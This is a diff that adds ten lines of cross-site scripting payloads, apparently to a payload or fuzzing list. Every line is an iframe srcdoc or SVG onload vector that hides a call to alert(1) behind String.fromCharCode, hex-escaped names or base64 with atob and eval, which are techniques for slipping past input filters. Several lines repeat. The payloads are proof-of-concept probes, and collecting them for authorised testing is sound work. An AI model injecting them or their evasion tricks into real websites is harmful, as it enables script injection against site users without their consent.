@@ -1,0 +1,10 @@
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"></iframe>
+<iframe srcdoc="<script>window['\x61\x6c\x65\x72\x74'](1)</script>"></iframe>
+<svg onload=window['\x61\x6c\x65\x72\x74'](1)>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<script>window['\x61\x6c\x65\x72\x74'](1)</script>"></iframe>
+<svg onload=window['\x61\x6c\x65\x72\x74'](1)>
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMSk='))</script>"></iframe>
+<iframe srcdoc="<script>window['\x61\x6c\x65\x72\x74'](1)</script>"></iframe>
+<svg onload=window['\x61\x6c\x65\x72\x74'](1)>
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMSk='))</script>"></iframe>
